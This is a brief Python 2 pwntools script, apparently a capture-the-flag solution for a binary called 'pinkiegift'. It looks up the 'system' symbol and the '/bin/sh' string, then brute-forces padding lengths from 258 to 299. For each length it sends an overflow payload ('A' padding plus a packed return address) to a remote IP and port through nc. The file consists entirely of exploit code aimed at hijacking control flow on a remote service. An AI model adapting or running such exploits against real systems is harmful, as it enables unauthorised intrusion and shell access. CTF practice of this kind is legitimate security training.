from pwn import *

e = ELF('./pinkiegift')

#for symbol in e.symbols:
#	print symbol + " " + hex(e.symbols[symbol])
system_off = e.symbols['system']
print e.search('/bin/sh\x00')

import os

for i in range(258,300):
	shell = 'python -c "from pwn import *; print \'A\'*{} + p32(0x8049940)" | nc 199.247.6.180 10006'.format(i)
	os.system(shell)
	print i
